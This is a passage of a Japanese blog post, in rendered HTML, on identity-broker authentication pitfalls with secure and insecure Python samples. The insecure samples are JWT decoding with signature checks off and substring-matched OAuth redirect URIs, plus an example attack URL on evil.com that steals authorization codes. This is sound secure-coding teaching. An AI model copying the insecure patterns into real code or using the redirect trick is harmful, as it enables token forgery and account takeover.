+@app<span class="token punctuation">.</span><span class="token function">route</span><span class="token punctuation">(</span><span class="token string">'/api/login'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+def <span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span>
+    data <span class="token operator">=</span> request<span class="token punctuation">.</span>json
+    tokens <span class="token operator">=</span> broker<span class="token punctuation">.</span><span class="token function">authenticate</span><span class="token punctuation">(</span>data<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> data<span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+    
+    response <span class="token operator">=</span> <span class="token function">make_response</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string-property property">'status'</span><span class="token operator">:</span> <span class="token string">'success'</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
+    
+    # <span class="token constant">HTTP</span><span class="token operator">-</span>only Cookie は JavaScript アクセスを防ぐ
+    response<span class="token punctuation">.</span><span class="token function">set_cookie</span><span class="token punctuation">(</span>
+        <span class="token string">'access_token'</span><span class="token punctuation">,</span>
+        tokens<span class="token punctuation">[</span><span class="token string">'access_token'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
+        httponly<span class="token operator">=</span>True<span class="token punctuation">,</span>  # JavaScript アクセスを防ぐ
+        secure<span class="token operator">=</span>True<span class="token punctuation">,</span>    # <span class="token constant">HTTPS</span> のみ
+        samesite<span class="token operator">=</span><span class="token string">'Strict'</span>  # <span class="token constant">CSRF</span> 保護
+    <span class="token punctuation">)</span>
+    
+    <span class="token keyword">return</span> response
+
+<span class="token comment">// クライアント側：トークン処理が不要</span>
+<span class="token keyword">function</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token parameter">username<span class="token punctuation">,</span> password</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'/api/login'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>
+        <span class="token literal-property property">method</span><span class="token operator">:</span> <span class="token string">'POST'</span><span class="token punctuation">,</span>
+        <span class="token literal-property property">credentials</span><span class="token operator">:</span> <span class="token string">'include'</span><span class="token punctuation">,</span>  <span class="token comment">// Cookie を送信</span>
+        <span class="token literal-property property">body</span><span class="token operator">:</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span><span class="token punctuation">{</span> username<span class="token punctuation">,</span> password <span class="token punctuation">}</span><span class="token punctuation">)</span>
+    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span></code></pre>
+<h3 id="落とし穴-2：トークン検証の欠如">落とし穴 2：トークン検証の欠如</h3>
+<p>アプリケーションは適切なトークン検証をスキップすることがあります：</p>
+<pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># ❌ 安全でない：検証なしでトークンを信頼</span>
+<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/api/user'</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">get_user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    token <span class="token operator">=</span> request<span class="token punctuation">.</span>headers<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'Authorization'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'Bearer '</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>
+    
+    <span class="token comment"># 検証なしでデコード！</span>
+    payload <span class="token operator">=</span> jwt<span class="token punctuation">.</span>decode<span class="token punctuation">(</span>token<span class="token punctuation">,</span> options<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">"verify_signature"</span><span class="token punctuation">:</span> <span class="token boolean">False</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
+    
+    <span class="token keyword">return</span> <span class="token punctuation">{</span><span class="token string">'user'</span><span class="token punctuation">:</span> payload<span class="token punctuation">[</span><span class="token string">'sub'</span><span class="token punctuation">]</span><span class="token punctuation">}</span>  <span class="token comment"># 攻撃者がトークンを偽造できる！</span></code></pre>
+<div class="admonition error"><p class="admonition-title"><span class="mdi mdi-alert-circle-outline admonition-icon"></span>🚫 検証の失敗</p><div class="admonition-content"><p><strong>署名検証の欠如</strong></p>
+<ul>
+<li>攻撃者が偽のトークンを作成可能</li>
+<li>暗号検証がない</li>
+<li>認証の完全なバイパス</li>
+</ul>
+<p><strong>有効期限チェックの欠如</strong></p>
+<ul>
+<li>期限切れのトークンが受け入れられる</li>
+<li>盗まれたトークンが無期限に有効</li>
+<li>時間ベースのセキュリティがない</li>
+</ul>
+<p><strong>オーディエンス検証の欠如</strong></p>
+<ul>
+<li>他のアプリケーションからのトークンを受け入れる</li>
+<li>アプリケーション間でのトークン再利用</li>
+<li>権限昇格リスク</li>
+</ul>
+</div></div>
+<p>適切なトークン検証：</p>
+<pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># ✅ 安全：完全なトークン検証</span>
+<span class="token keyword">from</span> jose <span class="token keyword">import</span> jwt<span class="token punctuation">,</span> JWTError
+
+<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/api/user'</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">get_user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    token <span class="token operator">=</span> request<span class="token punctuation">.</span>headers<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'Authorization'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'Bearer '</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>
+    
+    <span class="token keyword">try</span><span class="token punctuation">:</span>
+        payload <span class="token operator">=</span> jwt<span class="token punctuation">.</span>decode<span class="token punctuation">(</span>
+            token<span class="token punctuation">,</span>
+            key<span class="token operator">=</span>get_public_key<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
+            algorithms<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'RS256'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token comment"># 許可されたアルゴリズムを指定</span>
+            audience<span class="token operator">=</span><span class="token string">'my-application'</span><span class="token punctuation">,</span>  <span class="token comment"># オーディエンスを検証</span>
+            issuer<span class="token operator">=</span><span class="token string">'https://broker.example.com'</span>  <span class="token comment"># 発行者を検証</span>
+        <span class="token punctuation">)</span>
+        
+        <span class="token comment"># トークンは有効で検証済み</span>
+        <span class="token keyword">return</span> <span class="token punctuation">{</span><span class="token string">'user'</span><span class="token punctuation">:</span> payload<span class="token punctuation">[</span><span class="token string">'sub'</span><span class="token punctuation">]</span><span class="token punctuation">}</span>
+        
+    <span class="token keyword">except</span> jwt<span class="token punctuation">.</span>ExpiredSignatureError<span class="token punctuation">:</span>
+        <span class="token keyword">return</span> <span class="token punctuation">{</span><span class="token string">'error'</span><span class="token punctuation">:</span> <span class="token string">'トークンが期限切れ'</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token number">401</span>
+    <span class="token keyword">except</span> jwt<span class="token punctuation">.</span>JWTClaimsError<span class="token punctuation">:</span>
+        <span class="token keyword">return</span> <span class="token punctuation">{</span><span class="token string">'error'</span><span class="token punctuation">:</span> <span class="token string">'無効なクレーム'</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token number">401</span>
+    <span class="token keyword">except</span> JWTError<span class="token punctuation">:</span>
+        <span class="token keyword">return</span> <span class="token punctuation">{</span><span class="token string">'error'</span><span class="token punctuation">:</span> <span class="token string">'無効なトークン'</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token number">401</span></code></pre>
+<h3 id="落とし穴-3：安全でないリダイレクト-URI">落とし穴 3：安全でないリダイレクト URI</h3>
+<p>OAuth 2.0 リダイレクト URI 検証はセキュリティに不可欠です：</p>
+<pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># ❌ 安全でない：弱いリダイレクト URI 検証</span>
+<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/oauth/authorize'</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">authorize</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    client_id <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'client_id'</span><span class="token punctuation">)</span>
+    redirect_uri <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'redirect_uri'</span><span class="token punctuation">)</span>
+    
+    <span class="token comment"># 弱い検証：部分文字列マッチ</span>
+    <span class="token keyword">if</span> <span class="token string">'example.com'</span> <span class="token keyword">in</span> redirect_uri<span class="token punctuation">:</span>
+        <span class="token comment"># 認可コードを生成</span>
+        code <span class="token operator">=</span> generate_auth_code<span class="token punctuation">(</span>client_id<span class="token punctuation">)</span>
+        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">{</span>redirect_uri<span class="token punctuation">}</span></span><span class="token string">?code=</span><span class="token interpolation"><span class="token punctuation">{</span>code<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
+    
+    <span class="token keyword">return</span> <span class="token string">"無効なリダイレクト URI"</span><span class="token punctuation">,</span> <span class="token number">400</span>
+
+<span class="token comment"># 攻撃者は使用可能：https://evil.com?victim=example.com</span>
+<span class="token comment"># 検証が通過し、コードが攻撃者に送信される！</span></code></pre>
+<div class="admonition error"><p class="admonition-title"><span class="mdi mdi-alert-circle-outline admonition-icon"></span>🚫 リダイレクト URI の脆弱性</p><div class="admonition-content"><p><strong>オープンリダイレクト</strong></p>
+<ul>
+<li>認可コードが攻撃者に送信される</li>
+<li>アカウント乗っ取りの可能性</li>
+<li>フィッシング攻撃を可能にする</li>
+</ul>
+<p><strong>サブドメイン攻撃</strong></p>
+<ul>
+<li>弱い検証がサブドメインを許可</li>
+<li>攻撃者が悪意のあるサブドメインを登録</li>
+<li>認可コードを盗む</li>
+</ul>
+</div></div>
+<p>安全なリダイレクト URI 検証：</p>
+<pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># ✅ 安全：厳格なリダイレクト URI 検証</span>
+REGISTERED_CLIENTS <span class="token operator">=</span> <span class="token punctuation">{</span>
+    <span class="token string">'client123'</span><span class="token punctuation">:</span> <span class="token punctuation">{</span>
+        <span class="token string">'redirect_uris'</span><span class="token punctuation">:</span> <span class="token punctuation">[</span>
+            <span class="token string">'https://app.example.com/callback'</span><span class="token punctuation">,</span>
+            <span class="token string">'https://app.example.com/oauth/callback'</span>
+        <span class="token punctuation">]</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+
+<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/oauth/authorize'</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">authorize</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    client_id <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'client_id'</span><span class="token punctuation">)</span>
+    redirect_uri <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'redirect_uri'</span><span class="token punctuation">)</span>
+    
+    <span class="token comment"># 登録された URI との完全一致</span>
+    client <span class="token operator">=</span> REGISTERED_CLIENTS<span class="token punctuation">.</span>get<span class="token punctuation">(</span>client_id<span class="token punctuation">)</span>
+    <span class="token keyword">if</span> <span class="token keyword">not</span> client <span class="token keyword">or</span> redirect_uri <span class="token keyword">not</span> <span class="token keyword">in</span> client<span class="token punctuation">[</span><span class="token string">'redirect_uris'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
+        <span class="token keyword">return</span> <span class="token string">"無効なリダイレクト URI"</span><span class="token punctuation">,</span> <span class="token number">400</span>
+    
+    code <span class="token operator">=</span> generate_auth_code<span class="token punctuation">(</span>client_id<span class="token punctuation">)</span>
+    <span class="token keyword">return</span> redirect<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">{</span>redirect_uri<span class="token punctuation">}</span></span><span class="token string">?code=</span><span class="token interpolation"><span class="token punctuation">{</span>code<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span></code></pre>
+<h2 id="結論">結論</h2>
+<p>アイデンティティブローカーは、分散システムで認証を集中化し、シングルサインオン、プロトコル変換、統一されたアイデンティティ管理を提供します。しかし、実装の選択はセキュリティ、パフォーマンス、ユーザーエクスペリエンスに大きく影響します。</p>
+<p>トークンベースとセッションベースの認証の選択には、基本的なトレードオフが伴います。トークンベース認証はステートレスなスケーラビリティとマイクロサービスの互換性を提供しますが、失効とセキュリティリスクに苦しみます。セッションベース認証は即座の失効ときめ細かい制御を提供しますが、スケーラビリティの複雑さをもたらします。短期アクセストークンとサーバー側リフレッシュトークンを使用するハイブリッドアプローチは、業界のベストプラクティスを表し、セキュリティ、パフォーマンス、ユーザーエクスペリエンスのバランスを取ります。</p>
+<p>プロトコルの選択は、環境と要件によって異なります。OpenID Connect は新しいアプリケーションの最新標準であり、シンプルな統合、モバイルサポート、認証専用に構築された機能を提供します。SAML は複雑さにもかかわらず、エンタープライズ統合とレガシーシステムに不可欠です。OAuth 2.0 は認可のニーズに対応しますが、適切な認証には OpenID Connect が必要です。</p>
+<p>一般的な落とし穴がアイデンティティブローカーの実装を悩ませます。ローカルストレージにトークンを保存すると XSS 脆弱性が生じます—代わりに HTTP-only Cookie を使用してください。トークン検証の欠如により攻撃者がトークンを偽造できます—常に署名、有効期限、オーディエンス、発行者を検証してください。弱いリダイレクト URI 検証により認可コードが盗まれます—登録された URI との完全一致を使用してください。</p>
+<p>アイデンティティブローカーは最新の分散システムに不可欠なインフラストラクチャですが、慎重な実装が必要です。認証アプローチ間のトレードオフを理解し、適切なプロトコルを選択し、一般的なセキュリティの落とし穴を回避することで、アイデンティティブローカーがセキュリティ態勢を損なうのではなく強化することを保証します。複雑さは利点によって正当化されます：統一された認証、改善されたユーザーエクスペリエンス、アプリケーションエコシステム全体にわたる集中化されたセキュリティ制御です。</p>
+<!-- commentbox plugin begins -->
+    <div class="commentbox"></div>
+    <script src="https://unpkg.com/commentbox.io/dist/commentBox.min.js"></script>
+    <script>commentBox('5765834504929280-proj')</script>
+    <!-- commentbox plugin ends -->
+    
+        </div>
+        <footer class="article-footer">
+            
+    <a data-url="https://neo01.com/ja/2021/12/Identity-Broker-Patterns/" data-id="36000502" class="article-share-link"><i class="fa fa-share"></i>シェア</a>
+<script>
+    (function ($) {
+        $('body').on('click', function() {
+            $('.article-share-box.on').removeClass('on');
+        }).on('click', '.article-share-link', function(e) {
+            e.stopPropagation();
+
+            var $this = $(this),
+                url = $this.attr('data-url').replace("http://","https://"),
+                encodedUrl = encodeURIComponent(url),
+                id = 'article-share-box-' + $this.attr('data-id'),
+                offset = $this.offset(),
+                box;
+
+            if ($('#' + id).length) {
+                box = $('#' + id);
+
+                if (box.hasClass('on')){
+                    box.removeClass('on');
+                    return;
+                }
+            } else {
+                var html = [
+                    '<div id="' + id + '" class="article-share-box">',
+                        '<input class="article-share-input" value="' + url + '">',
+                        '<div class="article-share-links">',
+                            '<a href="https://twitter.com/intent/tweet?url=' + encodedUrl + '" class="article-share-twitter" target="_blank" title="Twitter"></a>',
+                            '<a href="https://www.facebook.com/sharer.php?u=' + encodedUrl + '" class="article-share-facebook" target="_blank" title="Facebook"></a>',
+                            '<a href="http://pinterest.com/pin/create/button/?url=' + encodedUrl + '" class="article-share-pinterest" target="_blank" title="Pinterest"></a>',
+                        '</div>',
+                    '</div>'
+                ].join('');
+
+              box = $(html);
+
+              $('body').append(box);
+            }
+
+            $('.article-share-box.on').hide();
+
+            box.css({
+                top: offset.top + 25,
+                left: offset.left
+            }).addClass('on');
+
+        }).on('click', '.article-share-box', function (e) {
+            e.stopPropagation();
+        }).on('click', '.article-share-box-input', function () {
+            $(this).select();
+        }).on('click', '.article-share-box-link', function (e) {
+            e.preventDefault();
+            e.stopPropagation();
+
+            window.open(this.href, 'article-share-box-window-' + Date.now(), 'width=500,height=450');
+        });
+    })(jQuery);
+</script>
+
+        </footer>
+    </div>
+    <!--script type="application/ld+json">
+    {
+        "@context": "https://schema.org",
+        "@type": "BlogPosting",
+        "author": {
+            "@type": "Person",
+            "name": "Neo Alienson"
+        },
+        "headline": "アイデンティティブローカー：分散システムにおける集中認証",
+        "image": "https://neo01.com",
+        "keywords": "Architecture Authentication Security",
+        "genre": "Development",
+        "datePublished": "2021-12-24",
+        "dateCreated": "2021-12-24",
+        "dateModified": "2025-10-23",
+        "url": "https://neo01.com//ja/2021/12/Identity-Broker-Patterns/",
+        "description": "アイデンティティブローカーは複数のシステムで認証を集中管理しますが、実装の選択はセキュリティ、パフォーマンス、ユーザーエクスペリエンスに影響します。パターン、トレードオフ、落とし穴を理解しましょう。",
+        "wordCount": 5360
+    }
+</script-->
+
+</article>
+
+                        </div>
+                    </section>
+                    <aside id="sidebar">
+    <a class="sidebar-toggle" title="Expand Sidebar"><i class="toggle icon"></i></a>
+    <div class="sidebar-top">
+        <p>フォロー:</p>
+        <ul class="social-links">
+                <li>
+                    <a class="social-tooltip" title="stack-exchange" href="https://stackexchange.com/users/2122053/neo?tab=accounts" target="_blank" rel="noopener">
+                        <i class="icon fa-brands fa-stack-exchange"></i>
+                    </a>
+                </li>
+                <li>
+                    <a class="social-tooltip" title="stack-overflow" href="https://stackoverflow.com/users/1885105/neo" target="_blank" rel="noopener">
+                        <i class="icon fa-brands fa-stack-overflow"></i>
+                    </a>
+                </li>
+                <li>
+                    <a class="social-tooltip" title="github" href="https://github.com/neoalienson" target="_blank" rel="noopener">
+                        <i class="icon fa-brands fa-github"></i>
+                    </a>
+                </li>
+                <li>
+                    <a class="social-tooltip" title="linkedin" href="https://linkedin.com/in/neo01" target="_blank" rel="noopener">
+                        <i class="icon fa-brands fa-linkedin"></i>
+                    </a>
+                </li>
+                <li>
+                    <a class="social-tooltip" title="rss" href="/atom.xml" target="_blank" rel="noopener">
+                        <i class="icon fa fa-rss"></i>
+                    </a>
+                </li>
+        </ul>
+    </div>
+    <div class="widgets-container">
+        
+            
+                <div class="widget-wrap widget-list">
+    <h3 class="widget-title">リンク</h3>
+    <div class="widget">
+        <ul><li><a href="/ja/ai">AI プレイグラウンド</a></li><li><a href="/ja/tools">ツール</a></li><li><a href="/ja/games">ゲーム</a></li><li><a href="/ja/pages/useful-information">役立つ情報</a></li><li><a href="/ja/pages/Hexo-Blogging-Cheatsheet">Hexo ブログチートシート</a></li></ul>
+    </div>
+</div>
+
+            
+                
+            
+                    <div class="widget-wrap">
+        <h3 class="widget-title">最新</h3>
+        <div class="widget">
+            <ul id="recent-post" class="">
+                    <li>
+                        <div class="item-thumbnail">
+                            <a href="/ja/2025/10/How-I-Use-AI-to-Learn/" class="thumbnail">
+        <span style="background-image:url(/assets/learning/thumbnail_80.png)" alt="AIを使った学習法：反復的知識構築による個人的な旅" class="thumbnail-image"></span>
+</a>
+                        </div>
+                        <div class="item-inner">
+                            <p class="item-category"><a class="article-category-link" href="/ja/categories/AI/">AI</a></p>
+                            <p class="item-title"><a href="/ja/2025/10/How-I-Use-AI-to-Learn/" class="title">AIを使った学習法：反復的知識構築による個人的な旅</a></p>
+                            <p class="item-date"><time datetime="2025-10-18T16:00:00.000Z" itemprop="datePublished">2025-10-19</time></p>
+                        </div>
+                    </li>
+                    <li>
+                        <div class="item-thumbnail">
+                            <a href="/ja/2025/10/Tools-Games-And-Browser-Built-In-AI/" class="thumbnail">
+        <span style="background-image:url(/2025/10/Tools-Games-And-Browser-Built-In-AI/thumbnail.jpeg)" alt="ツール、ゲーム、そしてブラウザ内蔵AIプレイグラウンド" class="thumbnail-image"></span>
+</a>
+                        </div>
+                        <div class="item-inner">
+                            <p class="item-category"><a class="article-category-link" href="/ja/categories/AI/">AI</a></p>
+                            <p class="item-title"><a href="/ja/2025/10/Tools-Games-And-Browser-Built-In-AI/" class="title">ツール、ゲーム、そしてブラウザ内蔵AIプレイグラウンド</a></p>
+                            <p class="item-date"><time datetime="2025-10-01T16:00:00.000Z" itemprop="datePublished">2025-10-02</time></p>
+                        </div>
+                    </li>
+                    <li>
+                        <div class="item-thumbnail">
+                            <a href="/ja/2025/09/The_Rise_of_Agentic_Coding_AI_Powered_Software_Engineering/" class="thumbnail">
+        <span style="background-image:url(/2025/09/The_Rise_of_Agentic_Coding_AI_Powered_Software_Engineering/thumbnail.jpeg)" alt="エージェントコーディングの台頭：AI駆動のソフトウェアエンジニアリング" class="thumbnail-image"></span>
+</a>
+                        </div>
+                        <div class="item-inner">
+                            <p class="item-category"><a class="article-category-link" href="/ja/categories/AI/">AI</a></p>
+                            <p class="item-title"><a href="/ja/2025/09/The_Rise_of_Agentic_Coding_AI_Powered_Software_Engineering/" class="title">エージェントコーディングの台頭：AI駆動のソフトウェアエンジニアリング</a></p>
+                            <p class="item-date"><time datetime="2025-09-19T16:00:00.000Z" itemprop="datePublished">2025-09-20</time></p>
+                        </div>
+                    </li>
+                    <li>
+                        <div class="item-thumbnail">
+                            <a href="/ja/2025/08/Understanding_Ephemeral_Ports_Part2/" class="thumbnail">
+        <span style="background-image:url(/assets/ports/thumbnail.png)" alt="エフェメラルポートを理解する パート2：サーバーアプリケーションが動的ポートを避けるべき理由" class="thumbnail-image"></span>
+</a>
+                        </div>
+                        <div class="item-inner">
+                            <p class="item-category"><a class="article-category-link" href="/ja/categories/Development/">開発</a></p>
+                            <p class="item-title"><a href="/ja/2025/08/Understanding_Ephemeral_Ports_Part2/" class="title">エフェメラルポートを理解する パート2：サーバーアプリケーションが動的ポートを避けるべき理由</a></p>
+                            <p class="item-date"><time datetime="2025-08-30T16:00:00.000Z" itemprop="datePublished">2025-08-31</time></p>
+                        </div>
+                    </li>
+                    <li>
+                        <div class="item-thumbnail">
+                            <a href="/ja/2025/08/Understanding_Ephemeral_Ports_Part1/" class="thumbnail">
+        <span style="background-image:url(/assets/ports/thumbnail.png)" alt="エフェメラルポートを理解する：ネットワーク通信の見えない働き手" class="thumbnail-image"></span>
+</a>
+                        </div>
+                        <div class="item-inner">
+                            <p class="item-category"><a class="article-category-link" href="/ja/categories/Development/">開発</a></p>
+                            <p class="item-title"><a href="/ja/2025/08/Understanding_Ephemeral_Ports_Part1/" class="title">エフェメラルポートを理解する：ネットワーク通信の見えない働き手</a></p>
+                            <p class="item-date"><time datetime="2025-08-29T16:00:00.000Z" itemprop="datePublished">2025-08-30</time></p>
+                        </div>
+                    </li>
+            </ul>
+        </div>
+    </div>
+
+            
+                
+    
+    
+    <div class="widget-wrap widget-list">
+        <h3 class="widget-title">アーカイブ</h3>
+        <div class="widget">
+            <ul class="archive-list">
+            
+                <li class="archive-list-item">
+                    <a class="archive-list-link" href="/ja/archives/2025/">2025</a>
+                    <span class="archive-list-count">14</span>
+                </li>
+            
+                <li class="archive-list-item">
+                    <a class="archive-list-link" href="/ja/archives/2024/">2024</a>
+                    <span class="archive-list-count">24</span>
+                </li>
+            
+                <li class="archive-list-item">
+                    <a class="archive-list-link" href="/ja/archives/2023/">2023</a>
+                    <span class="archive-list-count">15</span>
+                </li>
+            
+                <li class="archive-list-item">
+                    <a class="archive-list-link" href="/ja/archives/2022/">2022</a>
+                    <span class="archive-list-count">5</span>
+                </li>
+            
+                <li class="archive-list-item">
+                    <a class="archive-list-link" href="/ja/archives/2021/">2021</a>
+                    <span class="archive-list-count">12</span>
+                </li>
+            
+                <li class="archive-list-item">
+                    <a class="archive-list-link" href="/ja/archives/2020/">2020</a>
+                    <span class="archive-list-count">13</span>
+                </li>
+            
+                <li class="archive-list-item">
+                    <a class="archive-list-link" href="/ja/archives/2019/">2019</a>
+                    <span class="archive-list-count">12</span>
+                </li>
+            
+                <li class="archive-list-item">
+                    <a class="archive-list-link" href="/ja/archives/2018/">2018</a>
+                    <span class="archive-list-count">2</span>
+                </li>
+            
+                <li class="archive-list-item">
+                    <a class="archive-list-link" href="/ja/archives/2017/">2017</a>
+                    <span class="archive-list-count">5</span>
+                </li>
+            
+                <li class="archive-list-item">
+                    <a class="archive-list-link" href="/ja/archives/2016/">2016</a>
+                    <span class="archive-list-count">4</span>
+                </li>
+            
+                <li class="archive-list-item">
+                    <a class="archive-list-link" href="/ja/archives/2015/">2015</a>
+                    <span class="archive-list-count">6</span>
+                </li>
+            
+                <li class="archive-list-item">
+                    <a class="archive-list-link" href="/ja/archives/2014/">2014</a>
+                    <span class="archive-list-count">7</span>
+                </li>
+            
+                <li class="archive-list-item">
+                    <a class="archive-list-link" href="/ja/archives/2013/">2013</a>
+                    <span class="archive-list-count">2</span>
+                </li>
+            
+            </ul>
+        </div>
+    </div>
+
+
+            
+        
+    </div>
+</aside>
+
+                </div>
+            </div>
+        </div>
+        <!-- disable caching cause each page has different footer from qrcode -->
+        <!-- common/footer, null, {cache: !config.relative_link})  -->
+        <footer id="footer">
+    <div class="container">
+        <div class="container-inner">
+            <a id="back-to-top" href="javascript:;"><i class="icon fa fa-angle-up"></i></a>
+            <div class="qrcode-share-wrapper">
+                <div class="qrcode-text">https://neo01.com/l#e6c6dd02</div>
+                <img src="/qr/qr-792e0bbe077f37cd77bdd93756956a12.svg" width="200" height="200" alt="QR Code for https://neo01.com/l#e6c6dd02">
+            </div>
+            <div class="credit">
+                <h1 class="logo-wrap">
+                    <a href="/" title="Homepage" class="logo"></a>
+                </h1>
+                
+                <p>© 2025 Neo Alienson. All rights reserved.
+                  <a href="/ja/terms-and-conditions">Terms and Conditions</a></p>
+                
+            </div>
+            <div class="footer-plugins">
+              
+
+
+            </div>
+        </div>
+    </div>
+</footer>
+
+        
+    
+        
+
+
+        
+
+
+        
+
+
+        
+
+
+        
+
+
+        
+
+
+        
+
+
+        
+
+
+        
+
+
+    
+
+
+
+<!-- Custom Scripts -->
+
+
+
+
+    </div>
+<!-- hexo injector body_end start --><script type="text/javascript" src="/js/bundle_last.js"></script><!-- hexo injector body_end end -->
+
+</body></html>
